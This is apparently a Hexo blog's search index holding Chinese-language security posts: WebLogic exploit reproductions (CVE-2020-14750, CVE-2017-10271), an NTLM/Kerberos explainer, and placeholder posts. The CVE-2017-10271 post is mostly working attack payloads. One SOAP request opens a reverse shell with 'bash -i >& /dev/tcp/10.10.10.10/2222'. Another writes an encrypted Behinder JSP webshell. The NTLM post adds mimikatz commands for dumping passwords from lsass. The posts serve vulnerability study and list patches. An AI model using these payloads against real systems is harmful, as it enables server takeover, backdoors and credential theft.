<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Weblogic Console权限认证绕过漏洞（CVE-2020-14750）</title>
      <link href="/2023/05/20/weblogic-console-quan-xian-ren-zheng-rao-guo-lou-dong-cve-2020-14750/"/>
      <url>/2023/05/20/weblogic-console-quan-xian-ren-zheng-rao-guo-lou-dong-cve-2020-14750/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>该漏洞为 <code>CVE-2020-14882</code> 补丁的绕过，通过构造特殊的 <code>HTTP</code> 请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，从而执行任意代码</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><ul><li>WebLogic Server 10.3.6.0.0</li><li>WebLogic Server 12.1.3.0.0</li><li>WebLogic Server 12.2.1.3.0</li><li>WebLogic Server 12.2.1.4.0</li><li>WebLogic Server 14.1.1.0.0</li></ul><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>构造URL绕过登录</p><pre class="line-numbers language-none"><code class="language-none">console/images/%252E./console.portal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的<code>%252E</code>是<code>.</code>二次url编码的结果</p><p><img src="/../images/Weblogic-Console%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-14750%EF%BC%89%E5%9B%BE%E7%89%87/Snipaste_2023-05-20_00-47-19.png" alt="Snipaste_2023-05-20_00-47-19"></p><h2 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h2><ol><li><p>下载官方补丁修复</p><p><a href="https://www.oracle.com/security-alerts/alert-cve-2020-14750.html">https://www.oracle.com/security-alerts/alert-cve-2020-14750.html</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic XML Decoder反序列化漏洞(CVE-2017-10271)</title>
      <link href="/2023/05/19/weblogic-xml-decoder-fan-xu-lie-hua-lou-dong-cve-2017-10271/"/>
      <url>/2023/05/19/weblogic-xml-decoder-fan-xu-lie-hua-lou-dong-cve-2017-10271/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Weblogic简介"><a href="#0x01-Weblogic简介" class="headerlink" title="0x01 Weblogic简介"></a>0x01 Weblogic简介</h2><p>Weblogic是美国Oracle公司出品的一个 application server，确切地说是一个基于JavaEE架构的中间件。</p><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>Weblogic 的 WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析过程中出现反序列化漏洞，导致可执行任意命令。</p><p>影响范围：</p><ul><li>WebLogic Server 10.3.6.0.0</li><li>WebLogic Server 12.1.3.0.0</li><li>WebLogic Server 12.2.1.1.0</li><li>WebLogic Server 12.2.1.2.0</li></ul><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>访问目标网站，拼接以下路径，如果出现以下内容则可能存在漏洞</p><pre class="line-numbers language-none"><code class="language-none">/wls-wsat/CoordinatorPortType/wls-wsat/RegistrationPortTypeRPC/wls-wsat/ParticipantPortType/wls-wsat/RegistrationRequesterPortType/wls-wsat/CoordinatorPortType11/wls-wsat/RegistrationPortTypeRPC11/wls-wsat/ParticipantPortType11/wls-wsat/RegistrationRequesterPortType11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../images/Weblogic-XML-Decoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-10271%E5%9B%BE%E7%89%87/Snipaste_2023-05-19_15-20-43.png" alt="Snipaste_2023-05-19_15-20-43"></p><p>相关payload</p><p>其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误</p><p>head头中要将<code>Content-Type</code>的对应值修改为<code>text/xml</code></p><pre class="line-numbers language-none"><code class="language-none">POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 172.20.10.8:7001Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Type: text/xmlContent-Length: 611&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;&lt;void class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="3"&gt;&lt;void index="0"&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index="1"&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index="2"&gt;&lt;string&gt;bash -i &gt;&amp; /dev/tcp/10.10.10.10/2222 0&gt;&amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method="start"/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反弹shell</p><p><img src="/./../images/Weblogic-XML-Decoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-10271%E5%9B%BE%E7%89%87/Snipaste_2023-05-19_16-35-50.png" alt="Snipaste_2023-05-19_16-35-50"></p><p>执行命令</p><p><img src="/./../images/Weblogic-XML-Decoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-10271%E5%9B%BE%E7%89%87/Snipaste_2023-05-19_16-40-10.png" alt="Snipaste_2023-05-19_16-40-10"></p><p><img src="/./../images/Weblogic-XML-Decoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-10271%E5%9B%BE%E7%89%87/Snipaste_2023-05-19_16-39-50.png" alt="Snipaste_2023-05-19_16-39-50"></p><p>写入webshell</p><p>相关payload</p><pre class="line-numbers language-none"><code class="language-none">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;    &lt;soapenv:Header&gt;    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;    &lt;java&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;    &lt;object class="java.io.PrintWriter"&gt;     &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;    &lt;void method="println"&gt;&lt;string&gt;    &lt;![CDATA[&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;    ]]&gt;    &lt;/string&gt;    &lt;/void&gt;    &lt;void method="close"/&gt;    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;    &lt;/work:WorkContext&gt;    &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../images/Weblogic-XML-Decoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-10271%E5%9B%BE%E7%89%87/Snipaste_2023-05-19_16-59-10.png" alt="Snipaste_2023-05-19_16-59-10"></p><p>使用冰蝎连接</p><p><img src="/./../images/Weblogic-XML-Decoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-10271%E5%9B%BE%E7%89%87/Snipaste_2023-05-19_17-02-45.png" alt="Snipaste_2023-05-19_17-02-45"></p><h2 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h2><ol><li><p>对wls组件进行访问控制或删除</p></li><li><p>下载厂商发布的补丁进行修复</p><p><a href="http://www.oracle.com/technetwork/cn/topics/security/cpuoct2017-3236626-zhs.html">http://www.oracle.com/technetwork/cn/topics/security/cpuoct2017-3236626-zhs.html</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTLM与Kerberos协议</title>
      <link href="/2023/05/18/ntlm-yu-kerberos-xie-yi/"/>
      <url>/2023/05/18/ntlm-yu-kerberos-xie-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、NTLM协议"><a href="#一、NTLM协议" class="headerlink" title="一、NTLM协议"></a>一、NTLM协议</h2><p>NTLM（NewTechnology LAN Manager）协议是微软用于windows身份验证的主要协议之一。NTLM协议可用于工作组中的机器验证，又可用于域环境身份验证，还可为SMB、HTTP、LDAP、SMTP等上层微软应用提供身份验证。</p><h3 id="0x01-NTLM-Hash加密流程"><a href="#0x01-NTLM-Hash加密流程" class="headerlink" title="0x01 NTLM Hash加密流程"></a>0x01 NTLM Hash加密流程</h3><p>以760170为例</p><p>1）将用户密码转换为十六进制格式</p><pre class="line-numbers language-none"><code class="language-none">760170 -&gt; 转为十六进制 = 373630313730<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）将ASCII码的十六进制，即在每个字节之后添加0x00</p><pre class="line-numbers language-none"><code class="language-none">373630313730 -&gt; 转为Unicode编码 = 370036003000310037003000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）对Unicode编码的十六进制字符串进行MD4单向Hash加密。</p><pre class="line-numbers language-none"><code class="language-none">370036003000310037003000 -&gt; MD4加密 c908eb113f657fd0a03f386cadc14ceb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x02-NTLM-Hash本地认证流程"><a href="#0x02-NTLM-Hash本地认证流程" class="headerlink" title="0x02 NTLM Hash本地认证流程"></a>0x02 NTLM Hash本地认证流程</h3><p>用户密码经过NTLM Hash加密后存储在C:\Windows\System32\config\SAM 文件中</p><p>在本地登录Windows的情况下，操作系统会使用用户输入的密码转为NTLM Hash后，去与SAM文件中的NTLM Hash密码进行比较。</p><p>大致流程为：</p><pre class="line-numbers language-none"><code class="language-none">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; 转为Hash对比SAM文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当用户注销、重启、锁屏后，操作系统会让 winlogon.exe 显示登录页面，当 winlogon.exe 接收用户输入后，将密码交给 lsass.exe 进程，lsass.exe进程中会存一份明文密码，将明文密码加密成 NTLM Hash 后与 SAM 文件进行比较认证。mimikatz 就是从lsass.exe 进程中抓取明文密码或者 Hash 密码。</p><p>mimikatz读取用户密码</p><p>提升权限</p><pre class="line-numbers language-none"><code class="language-none">privilege::debug<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../images/NTLM%E4%B8%8EKerberos%E5%8D%8F%E8%AE%AE%E5%9B%BE%E7%89%87/Snipaste_2023-05-18_17-18-59.png" alt="Snipaste_2023-05-18_17-18-59"></p><p>读取密码</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::logonPasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../images/NTLM%E4%B8%8EKerberos%E5%8D%8F%E8%AE%AE%E5%9B%BE%E7%89%87/Snipaste_2023-05-18_17-19-32.png" alt="Snipaste_2023-05-18_17-19-32"></p><h3 id="0x03-NTLM-Hash协议认证"><a href="#0x03-NTLM-Hash协议认证" class="headerlink" title="0x03 NTLM Hash协议认证"></a>0x03 NTLM Hash协议认证</h3><p>NTLM协议是一种基于 Challenge/Response（质询/响应）的验证机制，由三种类型消息组成：</p><p>Type1（协商，Negotiate）</p><p>Type2（质询，Challenge）</p><p>Type3（认证，Authentication）</p><h4 id="1）工作组环境下的NTLM认证"><a href="#1）工作组环境下的NTLM认证" class="headerlink" title="1）工作组环境下的NTLM认证"></a>1）工作组环境下的NTLM认证</h4><p><img src="/./../images/NTLM%E4%B8%8EKerberos%E5%8D%8F%E8%AE%AE%E5%9B%BE%E7%89%87/QQ%E6%88%AA%E5%9B%BE20230518210552.png" alt="QQ截图20230518210552"></p><p>完整认证流程</p><ol><li>用户登录后，客户端缓存服务器密码的 NTLM Hash 值，然后客户端向服务器发送请求，请求利用 NTLM SSP 生成 NTLMSSP_NEGOTIATE 消息（简称Type1 协商消息）</li><li>服务端接收到Type1协商消息后，读取其中的内容，选择能接受的服务内容传入NTLM SSP，得到 NTLMSSP_CHALLENGE 消息（简称Type2 质询消息），并将Type2质询消息返回给客户端。Type2质询消息里有服务端生成的16位随机值，被称为 Challenge 值，服务端会将 Challenge 值进行缓存。</li><li>客户端收到Type2质询消息，取出 Challenge 值，用缓存服务器密码的 NTLM Hash 对 Challenge 值进行加密得到 Response 消息。然后将 Response 和其他信息封装到 NTLMSSP_AUTH 中（简称Type3 认证消息）发往服务端。</li><li>服务端接收到Type3认证消息后，取出 Net-NTLM Hash，然后用自己密码的 NTLM Hash 对 Challenge 值进行一系列加密运算，得到服务端计算的 Net-NTLM Hash，并与客户端的 Net-NTLM Hash 进行比较，相等则认证成功。</li></ol><h4 id="2）-域环境下的NTLM认证"><a href="#2）-域环境下的NTLM认证" class="headerlink" title="2） 域环境下的NTLM认证"></a>2） 域环境下的NTLM认证</h4><p><img src="/./../images/NTLM%E4%B8%8EKerberos%E5%8D%8F%E8%AE%AE%E5%9B%BE%E7%89%87/Snipaste_2023-05-18_21-16-13.png" alt="Snipaste_2023-05-18_21-16-13"></p><p>完整认证流程</p><p>1）用户登录后，客户端缓存服务器密码的 NTLM Hash 值。然后客户端向服务器发送请求，请求利用 NTLM SSP 生成 NTLMSSP_NEGOTIATE 消息（简称Type1 协商消息）</p><p>2）服务端接收到Type1协商消息后，读取其中的内容，选择能接受的服务内容传入NTLM SSP，得到 NTLMSSP_CHALLENGE 消息（简称Type2 质询消息），并将Type2质询消息返回给客户端。Type2质询消息里有服务端生成的16位随机值，被称为 Challenge 值，服务端会将 Challenge 值进行缓存。</p><p>3）客户端收到Type2质询消息，取出 Challenge 值，用缓存服务器密码的 NTLM Hash 对 Challenge 值进行加密得到 Response 消息。然后将 Response 和其他信息封装到 NTLMSSP_AUTH 中（简称Type3 认证消息）发往服务端。</p><p>4）服务端接收到Type3认证消息后，通过 Netlogon 协议与域控(Domain Controller)建立一个安全通道，将验证消息发送给域控。</p><p>5）域控收到服务器端发送的Type3认证消息，取出Net-NTLM Hash。然后从数据库中找到该用户的 NTLM Hash，对 Challenge 进行一系列加密运算，得到域控计算的Net-NTLM Hash  并与服务器端发送的Net-NTLM Hash进行比较，相等则认证成功，并将判断结果发送给服务端。</p><p>6）服务器端根据域控返回结果，对客户端进行回复。</p><h4 id="3）NTLM-v2协议"><a href="#3）NTLM-v2协议" class="headerlink" title="3）NTLM v2协议"></a>3）NTLM v2协议</h4><p>NTLM v1 和 NTLM v2 最显著的区别就是 Challenge 值与加密算法不同，共同点是都使用 NTLM Hash 进行加密。</p><p>Challenge 值：</p><pre class="line-numbers language-none"><code class="language-none">NTLM v1：8位NTLM v2：16位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Net-NTLM Hash 使用的加密算法：</p><pre class="line-numbers language-none"><code class="language-none">NTLM v1：DES加密算法NTLM v2：HMAC-MD5 加密算法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="二、Kerberos协议"><a href="#二、Kerberos协议" class="headerlink" title="二、Kerberos协议"></a>二、Kerberos协议</h2><p>Kerberos协议是一种网络身份验证协议，它旨在使用密钥加密技术为客户端/服务端应用程序提供强身份验证，需要三方共同参与才能完成一次认证。kerberos是域环境下的主要身份认证机制。</p><h3 id="0x01-Kerberos认证结构"><a href="#0x01-Kerberos认证结构" class="headerlink" title="0x01 Kerberos认证结构"></a>0x01 Kerberos认证结构</h3><p>Kerberos认证所需的三个角色</p><ol><li>客户端：代表用户，用户有自己的密码,server上运行的服务也有自己的密码,KDC是受信任的第三方认证中心,它拥有用户和服务的密码信息</li><li>服务器端：代表域控，域控当中存储了域内管理员与账户的信息,所有域内账户的认证和相关的密码策略都由域控来进行管理和控制,域控充当着门卫的角色。</li><li>提供认证服务的KDC（Key Distribution Center，密钥分发中心）：KDC是一种网络服务，在域环境中，KDC服务默认会安装在域控中，客户端如果想访问服务器的服务，前提是需要通过KDC认证，再由KDC的票据决定客户端是否有权限访问服务器的服务。</li></ol><p>Kerberos是一种基于票据（Ticket）的认证方式。客户端想要访问服务端的某个服务，首先需要购买服务端认可的ST（Service Ticket，服务票据）。也就是说，客户端在访问服务之前要买票，验票之后才能访问。但是这个票需要TGT（Ticket Granting Ticket，认购权证）。TGT 和 ST 都由 KDC 发放，但是KDC运行在域控上，所以说TGT和ST都有域控发放。</p><h3 id="0x02-Kerberos简单认证流程"><a href="#0x02-Kerberos简单认证流程" class="headerlink" title="0x02 Kerberos简单认证流程"></a>0x02 Kerberos简单认证流程</h3><p><img src="/./../images/NTLM%E4%B8%8EKerberos%E5%8D%8F%E8%AE%AE%E5%9B%BE%E7%89%87/image-20220916162410529.png" alt="image-20220916162410529"></p><p>Client想要访问Server的某个服务，就需要通过KDC的认证，获取到服务票据（ST），服务会验证服务票据（ST）来判断Client是否通过了KDC认证。为了避免Client每次访问Server的服务都要向KDC认证(输入密码)，KDC设计时分成了两个部分，一个是AS，另一个是TGS;AS接收Client的认证信息，认证通过后给Client发放一个可重复使用的票据TGT，后续Client使用这个TGT向TGS请求ST即可</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2022/09/25/test/"/>
      <url>/2022/09/25/test/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> test111 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/09/24/hello-world/"/>
      <url>/2022/09/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
